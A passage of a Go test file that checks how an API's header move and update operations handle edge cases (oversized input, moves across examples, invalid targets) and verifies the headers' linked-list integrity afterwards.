		if err != nil {
			t.Logf("Large input rejected (acceptable): %v", err)
		} else {
			t.Log("Large input accepted")
		}

		// Count current headers (may include previous test artifacts)
		currentHeaders, err := data.ehs.GetHeaderByExampleID(data.ctx, data.exampleID)
		if err != nil {
			t.Fatalf("Failed to get current headers: %v", err)
		}
		validateLinkedListIntegrity(t, data.ctx, data.ehs, data.exampleID, len(currentHeaders), "BufferOverflowAttempts")
	})

	t.Run("CrossExampleContamination", func(t *testing.T) {
		// Create a second example to test isolation
		otherData := setupEdgeCaseTestData(t)
		
		// Create headers in both examples
		header1ID := createEdgeTestHeader(t, data, "Example1-Header", "Example1-Value")
		header2ID := createEdgeTestHeader(t, otherData, "Example2-Header", "Example2-Value")

		// Try to move header from one example to another (should fail)
		req := &requestv1.HeaderMoveRequest{
			ExampleId:      data.exampleID.Bytes(),
			HeaderId:       header1ID.Bytes(),
			TargetHeaderId: header2ID.Bytes(), // Target from different example
			Position:       resourcesv1.MovePosition_MOVE_POSITION_AFTER,
		}

		_, err := data.rpc.HeaderMove(data.ctx, connect.NewRequest(req))
		if err == nil {
			t.Fatal("Expected error when trying to move header across examples")
		}

		// Verify both examples maintain integrity
		// Count current headers in first example (may include previous test artifacts)
		firstExampleHeaders, err := data.ehs.GetHeaderByExampleID(data.ctx, data.exampleID)
		if err != nil {
			t.Fatalf("Failed to get first example headers: %v", err)
		}
		validateLinkedListIntegrity(t, data.ctx, data.ehs, data.exampleID, len(firstExampleHeaders), "CrossExample_First")
		validateLinkedListIntegrity(t, otherData.ctx, otherData.ehs, otherData.exampleID, 1, "CrossExample_Second")
	})
}

// TestHeaderEdgeCases_RecoveryFromInvalidStates tests system recovery capabilities
func TestHeaderEdgeCases_RecoveryFromInvalidStates(t *testing.T) {
	data := setupEdgeCaseTestData(t)

	t.Run("RecoveryAfterFailedOperations", func(t *testing.T) {
		// Create initial headers
		header1ID := createEdgeTestHeader(t, data, "Recovery-1", "RecoveryValue-1")
		header2ID := createEdgeTestHeader(t, data, "Recovery-2", "RecoveryValue-2")
		header3ID := createEdgeTestHeader(t, data, "Recovery-3", "RecoveryValue-3")

		// Perform several operations that should fail
		failingOperations := []func() error{
			// Move header to itself
			func() error {
				req := &requestv1.HeaderMoveRequest{
					ExampleId:      data.exampleID.Bytes(),
					HeaderId:       header1ID.Bytes(),
					TargetHeaderId: header1ID.Bytes(),
					Position:       resourcesv1.MovePosition_MOVE_POSITION_AFTER,
				}
				_, err := data.rpc.HeaderMove(data.ctx, connect.NewRequest(req))
				return err
			},
			// Move to non-existent target
			func() error {
				req := &requestv1.HeaderMoveRequest{
					ExampleId:      data.exampleID.Bytes(),
					HeaderId:       header2ID.Bytes(),
					TargetHeaderId: idwrap.NewNow().Bytes(),
					Position:       resourcesv1.MovePosition_MOVE_POSITION_AFTER,
				}
				_, err := data.rpc.HeaderMove(data.ctx, connect.NewRequest(req))
				return err
			},
			// Update non-existent header
			func() error {
				nonExistentKey := "NonExistent"
				nonExistentValue := "NonExistentValue"
				nonExistentEnabled := true
				nonExistentDescription := "This should fail"
				req := &requestv1.HeaderUpdateRequest{
					HeaderId:    idwrap.NewNow().Bytes(),
					Key:         &nonExistentKey,
					Value:       &nonExistentValue,
					Enabled:     &nonExistentEnabled,
					Description: &nonExistentDescription,
				}
				_, err := data.rpc.HeaderUpdate(data.ctx, connect.NewRequest(req))
				return err
			},
		}

		// Execute failing operations
		for i, operation := range failingOperations {
			err := operation()
			if err == nil {
				t.Errorf("Operation %d should have failed", i)
			} else {
				t.Logf("Operation %d failed as expected: %v", i, err)
			}

			// After each failed operation, verify system integrity
			validateLinkedListIntegrity(t, data.ctx, data.ehs, data.exampleID, 3, fmt.Sprintf("RecoveryAfterFailure_%d", i))
		}

		// Perform successful operations to verify system is still functional
		req := &requestv1.HeaderMoveRequest{
			ExampleId:      data.exampleID.Bytes(),
			HeaderId:       header3ID.Bytes(),
			TargetHeaderId: header1ID.Bytes(),
			Position:       resourcesv1.MovePosition_MOVE_POSITION_BEFORE,
		}

		_, err := data.rpc.HeaderMove(data.ctx, connect.NewRequest(req))
		if err != nil {
			t.Fatalf("System should recover and allow valid operations: %v", err)
		}

		validateLinkedListIntegrity(t, data.ctx, data.ehs, data.exampleID, 3, "RecoveryVerification")
	})
}

// Helper function for ordering headers by position
func orderHeadersByPosition(headers []mexampleheader.Header) []mexampleheader.Header {
	if len(headers) == 0 {
		return headers
	}

	// Find the head (header with no previous)
	var head *mexampleheader.Header
	headerMap := make(map[string]*mexampleheader.Header)

	for i := range headers {
		headerMap[headers[i].ID.String()] = &headers[i]
		if headers[i].Prev == nil {
			head = &headers[i]
		}
	}

	if head == nil {
		return headers // Fallback to original order if no clear head
	}

	// Build ordered list
	var ordered []mexampleheader.Header
	current := head

	for current != nil {
		ordered = append(ordered, *current)
		if current.Next == nil {
			break
		}
		current = headerMap[current.Next.String()]
		
		// Prevent infinite loops
		if len(ordered) > len(headers) {
			break
		}
	}

	return ordered
}

// Helper functions are already defined in other test files